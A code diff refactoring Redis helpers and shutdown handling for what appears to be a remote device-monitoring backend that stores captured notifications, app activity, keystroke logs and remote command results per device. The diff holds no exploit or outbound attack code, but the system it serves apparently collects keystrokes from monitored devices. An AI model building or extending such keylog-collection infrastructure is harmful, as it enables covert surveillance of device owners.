@@ -193,91 +193,97 @@ function client() { return redis; }
 // ── Device helpers ────────────────────────────────────────────────────────────
 
 async function saveDevice(deviceId, info) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
         const key = K.device(deviceId);
         const payload = typeof info === 'string' ? info : JSON.stringify(info);
-        await redis.setex(key, TTL.device, payload);
-        await redis.sadd(K.deviceList(), deviceId);
+        await client.setex(key, TTL.device, payload);
+        await client.sadd(K.deviceList(), deviceId);
         if (info.isOnline) {
-            await redis.sadd(K.deviceOnline(), deviceId);
+            await client.sadd(K.deviceOnline(), deviceId);
         } else {
-            await redis.srem(K.deviceOnline(), deviceId);
+            await client.srem(K.deviceOnline(), deviceId);
         }
     } catch (e) {
-        log(`saveDevice error: ${e.message}`, 'warn');
+        logOperationError('saveDevice', e, client);
     }
 }
 
 async function getDevice(deviceId) {
-    if (!isConnected()) return null;
+    const client = readyClient();
+    if (!client) return null;
     try {
-        const raw = await redis.get(K.device(deviceId));
+        const raw = await client.get(K.device(deviceId));
         return raw ? JSON.parse(raw) : null;
     } catch (e) {
-        log(`getDevice error: ${e.message}`, 'warn');
+        logOperationError('getDevice', e, client);
         return null;
     }
 }
 
 async function getAllDevices() {
-    if (!isConnected()) return [];
+    const client = readyClient();
+    if (!client) return [];
     try {
-        const ids = await redis.smembers(K.deviceList());
+        const ids = await client.smembers(K.deviceList());
         if (!ids.length) return [];
-        const pipeline = redis.pipeline();
+        const pipeline = client.pipeline();
         ids.forEach(id => pipeline.get(K.device(id)));
         const results = await pipeline.exec();
         return results
             .map(([err, val]) => (!err && val ? JSON.parse(val) : null))
             .filter(Boolean);
     } catch (e) {
-        log(`getAllDevices error: ${e.message}`, 'warn');
+        logOperationError('getAllDevices', e, client);
         return [];
     }
 }
 
 async function markDeviceOnline(deviceId) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
-        await redis.sadd(K.deviceOnline(), deviceId);
-        const raw = await redis.get(K.device(deviceId));
+        await client.sadd(K.deviceOnline(), deviceId);
+        const raw = await client.get(K.device(deviceId));
         if (raw) {
             const d = JSON.parse(raw);
             d.isOnline = true;
             d.lastSeen = new Date().toISOString();
-            await redis.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
+            await client.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
         }
     } catch (e) {
-        log(`markDeviceOnline error: ${e.message}`, 'warn');
+        logOperationError('markDeviceOnline', e, client);
     }
 }
 
 async function markDeviceOffline(deviceId) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
-        await redis.srem(K.deviceOnline(), deviceId);
-        const raw = await redis.get(K.device(deviceId));
+        await client.srem(K.deviceOnline(), deviceId);
+        const raw = await client.get(K.device(deviceId));
         if (raw) {
             const d = JSON.parse(raw);
             d.isOnline = false;
             d.lastSeen = new Date().toISOString();
-            await redis.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
+            await client.setex(K.device(deviceId), TTL.device, JSON.stringify(d));
         }
     } catch (e) {
-        log(`markDeviceOffline error: ${e.message}`, 'warn');
+        logOperationError('markDeviceOffline', e, client);
     }
 }
 
 async function removeDevice(deviceId) {
-    if (!isConnected()) return false;
+    const client = readyClient();
+    if (!client) return false;
     try {
-        await redis.del(K.device(deviceId));
-        await redis.srem(K.deviceList(), deviceId);
-        await redis.srem(K.deviceOnline(), deviceId);
+        await client.del(K.device(deviceId));
+        await client.srem(K.deviceList(), deviceId);
+        await client.srem(K.deviceOnline(), deviceId);
         return true;
     } catch (e) {
-        log(`removeDevice error: ${e.message}`, 'warn');
+        logOperationError('removeDevice', e, client);
         return false;
     }
 }
@@ -285,24 +291,26 @@ async function removeDevice(deviceId) {
 // ── Notification helpers ──────────────────────────────────────────────────────
 
 async function pushNotification(deviceId, entry) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
         const key = K.notifications(deviceId);
-        await redis.lpush(key, JSON.stringify(entry));
-        await redis.ltrim(key, 0, CAP.notifications - 1);
-        await redis.expire(key, TTL.notifications);
+        await client.lpush(key, JSON.stringify(entry));
+        await client.ltrim(key, 0, CAP.notifications - 1);
+        await client.expire(key, TTL.notifications);
     } catch (e) {
-        log(`pushNotification error: ${e.message}`, 'warn');
+        logOperationError('pushNotification', e, client);
     }
 }
 
 async function getNotifications(deviceId) {
-    if (!isConnected()) return [];
+    const client = readyClient();
+    if (!client) return [];
     try {
-        const items = await redis.lrange(K.notifications(deviceId), 0, -1);
+        const items = await client.lrange(K.notifications(deviceId), 0, -1);
         return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
     } catch (e) {
-        log(`getNotifications error: ${e.message}`, 'warn');
+        logOperationError('getNotifications', e, client);
         return [];
     }
 }
@@ -310,30 +318,32 @@ async function getNotifications(deviceId) {
 // ── Activity helpers ──────────────────────────────────────────────────────────
 
 async function pushActivity(deviceId, entry) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
         const key = K.activity(deviceId);
         // Dedupe consecutive same-app entries
-        const latest = await redis.lindex(key, 0);
+        const latest = await client.lindex(key, 0);
         if (latest) {
             const prev = JSON.parse(latest);
             if (prev.packageName === entry.packageName) return;
         }
-        await redis.lpush(key, JSON.stringify(entry));
-        await redis.ltrim(key, 0, CAP.activity - 1);
-        await redis.expire(key, TTL.activity);
+        await client.lpush(key, JSON.stringify(entry));
+        await client.ltrim(key, 0, CAP.activity - 1);
+        await client.expire(key, TTL.activity);
     } catch (e) {
-        log(`pushActivity error: ${e.message}`, 'warn');
+        logOperationError('pushActivity', e, client);
     }
 }
 
 async function getActivity(deviceId) {
-    if (!isConnected()) return [];
+    const client = readyClient();
+    if (!client) return [];
     try {
-        const items = await redis.lrange(K.activity(deviceId), 0, -1);
+        const items = await client.lrange(K.activity(deviceId), 0, -1);
         return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
     } catch (e) {
-        log(`getActivity error: ${e.message}`, 'warn');
+        logOperationError('getActivity', e, client);
         return [];
     }
 }
@@ -341,24 +351,26 @@ async function getActivity(deviceId) {
 // ── Keylog helpers ────────────────────────────────────────────────────────────
 
 async function pushKeylog(deviceId, entry) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
         const key = K.keylogs(deviceId);
-        await redis.lpush(key, JSON.stringify(entry));
-        await redis.ltrim(key, 0, CAP.keylogs - 1);
-        await redis.expire(key, TTL.keylogs);
+        await client.lpush(key, JSON.stringify(entry));
+        await client.ltrim(key, 0, CAP.keylogs - 1);
+        await client.expire(key, TTL.keylogs);
     } catch (e) {
-        log(`pushKeylog error: ${e.message}`, 'warn');
+        logOperationError('pushKeylog', e, client);
     }
 }
 
 async function getKeylogs(deviceId) {
-    if (!isConnected()) return [];
+    const client = readyClient();
+    if (!client) return [];
     try {
-        const items = await redis.lrange(K.keylogs(deviceId), 0, -1);
+        const items = await client.lrange(K.keylogs(deviceId), 0, -1);
         return items.map(i => { try { return JSON.parse(i); } catch { return null; } }).filter(Boolean);
     } catch (e) {
-        log(`getKeylogs error: ${e.message}`, 'warn');
+        logOperationError('getKeylogs', e, client);
         return [];
     }
 }
@@ -366,21 +378,23 @@ async function getKeylogs(deviceId) {
 // ── Command cache helpers ─────────────────────────────────────────────────────
 
 async function cacheCommandResult(commandId, result) {
-    if (!isConnected()) return;
+    const client = readyClient();
+    if (!client) return;
     try {
-        await redis.setex(K.command(commandId), TTL.command, JSON.stringify(result));
+        await client.setex(K.command(commandId), TTL.command, JSON.stringify(result));
     } catch (e) {
-        log(`cacheCommandResult error: ${e.message}`, 'warn');
+        logOperationError('cacheCommandResult', e, client);
     }
 }
 
 async function getCachedCommandResult(commandId) {
-    if (!isConnected()) return null;
+    const client = readyClient();
+    if (!client) return null;
     try {
-        const raw = await redis.get(K.command(commandId));
+        const raw = await client.get(K.command(commandId));
         return raw ? JSON.parse(raw) : null;
     } catch (e) {
-        log(`getCachedCommandResult error: ${e.message}`, 'warn');
+        logOperationError('getCachedCommandResult', e, client);
         return null;
     }
 }
@@ -388,15 +402,17 @@ async function getCachedCommandResult(commandId) {
 // ── Stats ─────────────────────────────────────────────────────────────────────
 
 async function getStats() {
-    if (!isConnected()) return { connected: false };
+    const client = readyClient();
+    if (!client) return { connected: false };
     try {
-        const info = await redis.info('stats');
-        const onlineCount = await redis.scard(K.deviceOnline());
-        const totalCount  = await redis.scard(K.deviceList());
-        const memLine     = (await redis.info('memory')).split('\n').find(l => l.startsWith('used_memory_human'));
+        await client.info('stats');
+        const onlineCount = await client.scard(K.deviceOnline());
+        const totalCount  = await client.scard(K.deviceList());
+        const memLine     = (await client.info('memory')).split('\n').find(l => l.startsWith('used_memory_human'));
         const memUsed     = memLine ? memLine.split(':')[1].trim() : 'unknown';
         return { connected: true, onlineDevices: onlineCount, totalDevices: totalCount, memoryUsed: memUsed };
     } catch (e) {
+        logOperationError('getStats', e, client);
         return { connected: false, error: e.message };
     }
 }
@@ -408,18 +424,19 @@ async function getStats() {
  * without a device ID. Scoped resets preserve other devices' cached results.
  */
 async function clearCommandCache(deviceId = null) {
-    if (!isConnected()) return 0;
+    const client = readyClient();
+    if (!client) return 0;
     try {
         const targetDeviceId = deviceId == null ? null : String(deviceId);
         let cursor = '0';
         let deleted = 0;
         do {
-            const [nextCursor, keys] = await redis.scan(cursor, 'MATCH', 'command:*', 'COUNT', 200);
+            const [nextCursor, keys] = await client.scan(cursor, 'MATCH', 'command:*', 'COUNT', 200);
             cursor = nextCursor;
             if (keys.length) {
                 let deleteKeys = keys;
                 if (targetDeviceId !== null) {
-                    const values = await redis.mget(...keys);
+                    const values = await client.mget(...keys);
                     deleteKeys = keys.filter((key, index) => {
                         if (!values[index]) return false;
                         try {
@@ -430,7 +447,7 @@ async function clearCommandCache(deviceId = null) {
                     });
                 }
                 if (deleteKeys.length) {
-                    await redis.del(...deleteKeys);
+                    await client.del(...deleteKeys);
                     deleted += deleteKeys.length;
                 }
             }
@@ -438,7 +455,7 @@ async function clearCommandCache(deviceId = null) {
         log(`clearCommandCache: removed ${deleted} command cache key(s)${targetDeviceId === null ? '' : ` for ${targetDeviceId}`}`);
         return deleted;
     } catch (e) {
-        log(`clearCommandCache error: ${e.message}`, 'warn');
+        logOperationError('clearCommandCache', e, client);
         return 0;
     }
 }
@@ -446,17 +463,37 @@ async function clearCommandCache(deviceId = null) {
 // ── Graceful shutdown ─────────────────────────────────────────────────────────
 
 async function quit() {
-    if (redis) {
-        stopKeepAlive();
-        try { await redis.quit(); log('Disconnected gracefully'); }
-        catch (e) { redis.disconnect(); }
-        finally {
-            redis = null;
-            connected = false;
-            initPromise = null;
+    stopKeepAlive();
+    const client = redis;
+    ++redisGeneration;
+    redis = null;
+    connected = false;
+    initPromise = null;
+    if (!client) return;
+
+    if (client.status !== 'ready') {
+        try { client.disconnect(); } catch (_) {}
+        return;
+    }
+
+    let timeout;
+    try {
+        await Promise.race([
+            client.quit().catch(() => {}),
+            new Promise(resolve => {
+                timeout = setTimeout(resolve, 2000);
+                timeout.unref?.();
+            }),
+        ]);
+        log('Disconnected gracefully');
+    } catch (_) {
+        // A closing/reconnecting Redis client is already unavailable; do not
+        // let shutdown wait indefinitely for its QUIT response.
+    } finally {
+        if (timeout) clearTimeout(timeout);
+        if (client.status !== 'end') {
+            try { client.disconnect(); } catch (_) {}
         }
-    } else {
-        stopKeepAlive();
     }
 }
 
